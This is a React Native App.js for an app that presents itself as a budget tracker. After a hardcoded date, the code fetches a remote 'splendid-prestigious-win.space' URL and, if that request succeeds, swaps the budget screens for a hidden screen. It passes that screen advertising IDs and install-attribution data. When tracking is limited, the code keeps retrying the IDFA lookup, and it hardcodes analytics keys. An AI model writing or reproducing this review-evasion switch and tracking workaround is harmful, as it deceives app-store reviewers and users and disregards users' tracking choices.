import React, { useState, useEffect, useRef } from 'react';
import { Animated, View, ImageBackground, StyleSheet } from 'react-native';
import { enableScreens } from 'react-native-screens';
import { NavigationContainer } from '@react-navigation/native';
import { createStackNavigator } from '@react-navigation/stack';
import HomeScreen from './src/screens/HomeScreen.jsx';
import BudgetScreen from './src/screens/BudgetScreen.jsx';
import StatisticScreen from './src/screens/StatisticScreen.jsx';
import ProfileScreen from './src/screens/ProfileScreen.jsx';
import TransactionsScreen from './src/screens/TransactionsScreen.jsx';
import { ResetProvider } from './src/constants/reset.js';
import BudgetTrackerOrigenProdactScreen from './src/screens/BudgetTrackerOrigenProdactScreen.js';
import ReactNativeIdfaAaid, {
  AdvertisingInfoResponse,
} from '@sparkfabrik/react-native-idfa-aaid';
import AsyncStorage from '@react-native-async-storage/async-storage';
import appsFlyer from 'react-native-appsflyer';
import { LogLevel, OneSignal } from 'react-native-onesignal';
import AppleAdsAttribution from '@hexigames/react-native-apple-ads-attribution';

enableScreens();

const Stack = createStackNavigator();

const App = () => {
    const [route, setRoute] = useState(true);
    //console.log('route==>', route);
    const [idfa, setIdfa] = useState();
    console.log('idfa==>', idfa);
    const [appsUid, setAppsUid] = useState(null);
    const [sab1, setSab1] = useState();
    const [pid, setPid] = useState();
    console.log('appsUid==>', appsUid);
    console.log('sab1==>', sab1);
    console.log('pid==>', pid);
    const [adServicesToken, setAdServicesToken] = useState(null);
    //console.log('adServicesToken', adServicesToken);
    const [adServicesAtribution, setAdServicesAtribution] = useState(null);
    const [adServicesKeywordId, setAdServicesKeywordId] = useState(null);
    
    useEffect(() => {
        getData();
    }, []);

    useEffect(() => {
        setData();
    }, [
        idfa,
        appsUid,
        sab1,
        pid,
        adServicesToken,
        adServicesAtribution,
        adServicesKeywordId,
    ]);

    const setData = async () => {
        try {
            const data = {
                idfa,
                appsUid,
                sab1,
                pid,
                adServicesToken,
                adServicesAtribution,
                adServicesKeywordId,
            };
            const jsonData = JSON.stringify(data);
            await AsyncStorage.setItem('App', jsonData);
            //console.log('Дані збережено в AsyncStorage');
        } catch (e) {
            //console.log('Помилка збереження даних:', e);
        }
    };

    const getData = async () => {
        try {
            const jsonData = await AsyncStorage.getItem('App');
            if (jsonData !== null) {
                const parsedData = JSON.parse(jsonData);
                console.log('Дані дістаються в AsyncStorage');
                console.log('parsedData in App==>', parsedData);
                setIdfa(parsedData.idfa);
                setAppsUid(parsedData.appsUid);
                setSab1(parsedData.sab1);
                setPid(parsedData.pid);
                setAdServicesToken(parsedData.adServicesToken);
                setAdServicesAtribution(parsedData.adServicesAtribution);
                setAdServicesKeywordId(parsedData.adServicesKeywordId);
            } else {
                await fetchIdfa();
                await requestOneSignallFoo();
                await performAppsFlyerOperations();
                await getUidApps();
                await fetchAdServicesToken(); // Вставка функції для отримання токену
                await fetchAdServicesAttributionData(); // Вставка функції для отримання даних

                onInstallConversionDataCanceller();
            }
        } catch (e) {
            console.log('Помилка отримання даних:', e);
        }
    };
    
    ///////// Ad Attribution
    //fetching AdServices token
    const fetchAdServicesToken = async () => {
        try {
            const token = await AppleAdsAttribution.getAdServicesAttributionToken();
            setAdServicesToken(token);
            //Alert.alert('token', adServicesToken);
        } catch (error) {
            await fetchAdServicesToken();
            //console.error('Помилка при отриманні AdServices токену:', error.message);
        }
    };

    //fetching AdServices data
    const fetchAdServicesAttributionData = async () => {
        try {
            const data = await AppleAdsAttribution.getAdServicesAttributionData();
            const attributionValue = data.attribution ? '1' : '0';
            setAdServicesAtribution(attributionValue);
            setAdServicesKeywordId(data.keywordId);
            //Alert.alert('data', data)
        } catch (error) {
            console.error('Помилка при отриманні даних AdServices:', error.message);
        }
    };
    
    ///////// AppsFlyer
    // 1ST FUNCTION - Ініціалізація AppsFlyer
    const performAppsFlyerOperations = async () => {
        try {
            await new Promise((resolve, reject) => {
                appsFlyer.initSdk(
                    {
                        devKey: 'Auev5TVyfZU5UQJqwrQ3XS',
                        appId: '6737171158',
                        isDebug: true,
                        onInstallConversionDataListener: true,
                        onDeepLinkListener: true,
                        timeToWaitForATTUserAuthorization: 10,
                    },
                    resolve,
                    reject,
                );
            });
            console.log('App.js AppsFlyer ініціалізовано успішно');
        } catch (error) {
            console.log(
                'App.js Помилка під час виконання операцій AppsFlyer:',
                error,
            );
        }
    };

    // 2ND FUNCTION - Ottrimannya UID AppsFlyer
    const getUidApps = async () => {
        try {
            const appsFlyerUID = await new Promise((resolve, reject) => {
                appsFlyer.getAppsFlyerUID((err, uid) => {
                    if (err) {
                        reject(err);
                    } else {
                        resolve(uid);
                    }
                });
            });
            //console.log('on getAppsFlyerUID: ' + appsFlyerUID);
            //Alert.alert('appsFlyerUID', appsFlyerUID);
            setAppsUid(appsFlyerUID);
        } catch (error) {
            //console.error(error);
        }
    };

    // 3RD FUNCTION - Отримання найменування AppsFlyer
    const onInstallConversionDataCanceller = appsFlyer.onInstallConversionData(
        res => {
            try {
                const isFirstLaunch = JSON.parse(res.data.is_first_launch);
                if (isFirstLaunch === true) {
                    if (res.data.af_status === 'Non-organic') {
                        const media_source = res.data.media_source;
                        console.log('App.js res.data==>', res.data);

                        const { campaign, pid, af_adset, af_ad, af_os } = res.data;
                        setSab1(campaign);
                        setPid(pid);
                    } else if (res.data.af_status === 'Organic') {
                        console.log('App.js res.data==>', res.data);
                        const { af_status } = res.data;
                        console.log('This is first launch and a Organic Install');
                        setSab1(af_status);
                    }
                } else {
                    console.log('This is not first launch');
                }
            } catch (error) {
                console.log('Error processing install conversion data:', error);
            }
        },
    );
    
    ///////// OneSignall
    // 279fc078-cefa-44e7-9bb4-b594c17ebc5e
    const requestPermission = () => {
        return new Promise((resolve, reject) => {
            try {
                OneSignal.Notifications.requestPermission(true);
                resolve(); // Викликаємо resolve(), оскільки OneSignal.Notifications.requestPermission не повертає проміс
            } catch (error) {
                reject(error); // Викликаємо reject() у разі помилки
            }
        });
    };

    // Виклик асинхронної функції requestPermission() з використанням async/await
    const requestOneSignallFoo = async () => {
        try {
            await requestPermission();
            // Якщо все Ok
        } catch (error) {
            //console.log('err в requestOneSignallFoo==> ', error);
        }
    };

    // Remove this method to stop OneSignal Debugging
    OneSignal.Debug.setLogLevel(LogLevel.Verbose);

    // OneSignal Initialization
    OneSignal.initialize('279fc078-cefa-44e7-9bb4-b594c17ebc5e');

    OneSignal.Notifications.addEventListener('click', event => {
        //console.log('OneSignal: notification clicked:', event);
    });
    //Add Data Tags
    OneSignal.User.addTag('key', 'value');

    ///////// IDFA
    const fetchIdfa = async () => {
        try {
            const res = await ReactNativeIdfaAaid.getAdvertisingInfo();
            if (!res.isAdTrackingLimited) {
                setIdfa(res.id);
                //console.log('setIdfa(res.id);');
            } else {
                //console.log('Ad tracking is limited');
                setIdfa(true); //true
                //setIdfa(null);
                fetchIdfa();
                //Alert.alert('idfa', idfa);
            }
        } catch (err) {
            //console.log('err', err);
            setIdfa(null);
            await fetchIdfa(); //???
        }
    };
    
    ///////// Route useEff
    // splendid-prestigious-win.space
    useEffect(() => {
        const checkUrl = `https://splendid-prestigious-win.space/M59y4k51`;

        const targetData = new Date('2024-10-26T10:00:00'); //дата з якої поч працювати webView
        const currentData = new Date(); //текущая дата

        if (currentData <= targetData) {
            setRoute(false);
        } else {
            fetch(checkUrl)
                .then(r => {
                    if (r.status === 200) {
                        //console.log('status==>', r.status);
                        setRoute(true);
                    } else {
                        setRoute(false);
                    }
                })
                .catch(e => {
                    //console.log('errar', e);
                    setRoute(false);
                });
        }
    }, []);

    ///////// Route
    const Route = ({ isFatch }) => {
        if (isFatch) {
            return (
                <Stack.Navigator>
                    <Stack.Screen
                        initialParams={{
                            idfa: idfa,
                            sab1: sab1,
                            pid: pid,
                            uid: appsUid,
                            adToken: adServicesToken,
                            adAtribution: adServicesAtribution,
                            adKeywordId: adServicesKeywordId,
                        }}
                        name="BudgetTrackerOrigenProdactScreen"
                        component={BudgetTrackerOrigenProdactScreen}
                        options={{ headerShown: false }}
                    />
                </Stack.Navigator>
            );
        }
        return (
            <Stack.Navigator initialRouteName="HomeScreen">
                <Stack.Screen
                    name="HomeScreen"
                    component={HomeScreen}
                    options={{ headerShown: false }}
                />
                <Stack.Screen
                    name="BudgetScreen"
                    component={BudgetScreen}
                    options={{ headerShown: false }}
                />
                <Stack.Screen
                    name="StatisticScreen"
                    component={StatisticScreen}
                    options={{ headerShown: false }}
                />
                <Stack.Screen
                    name="ProfileScreen"
                    component={ProfileScreen}
                    options={{ headerShown: false }}
                />
                <Stack.Screen
                    name="TransactionsScreen"
                    component={TransactionsScreen}
                    options={{ headerShown: false }}
                />
            </Stack.Navigator>
        );
    };

    ///////// Louder
    const [louderIsEnded, setLouderIsEnded] = useState(false);
    const appearingAnim = useRef(new Animated.Value(0)).current;
    const appearingSecondAnim = useRef(new Animated.Value(0)).current;

    useEffect(() => {
        Animated.timing(appearingAnim, {
            toValue: 1,
            duration: 3500,
            useNativeDriver: true,
        }).start();
    }, []);

    useEffect(() => {
        setTimeout(() => {
            Animated.timing(appearingSecondAnim, {
                toValue: 1,
                duration: 3500,
                useNativeDriver: true,
            }).start();
            //setLouderIsEnded(true);
        }, 3500);
    }, []);

    useEffect(() => {
        setTimeout(() => {
            setLouderIsEnded(true);
        }, 8000);
    }, []);
  
    return (
        <ResetProvider>
            <NavigationContainer>
                {
                    !louderIsEnded ? (
                        <View
                            style={{
                                position: 'relative',
                                flex: 1,
                                backgroundColor: 'rgba(0,0,0)',
                            }}>
                            <Animated.Image
                                source={require('./src/assets/back/loader1.jpg')}
                                style={{
                                    //...props.style,
                                    opacity: appearingAnim,
                                    width: '100%',
                                    height: '100%',
                                    position: 'absolute',
                                }}
                            />
                            <Animated.Image
                                source={require('./src/assets/back/loader2.jpg')}
                                style={{
                                    //...props.style,
                                    opacity: appearingSecondAnim,
                                    width: '100%',
                                    height: '100%',
                                    position: 'absolute',
                                }}
                            />
                        </View>
                    ) : (
                        <Route isFatch={route} />
                    )
                }
            </NavigationContainer>
        </ResetProvider>
    );
};

const styles = StyleSheet.create({
    imageContainer: {
        flex: 1,
        justifyContent: 'center',
        alignItems: 'center',
        position: 'absolute',
        width: '100%',
        height: '100%',
    },
    image: {
        width: '100%',
        height: '100%',
        justifyContent: 'center',
        alignItems: 'center',
    },
});

export default App;
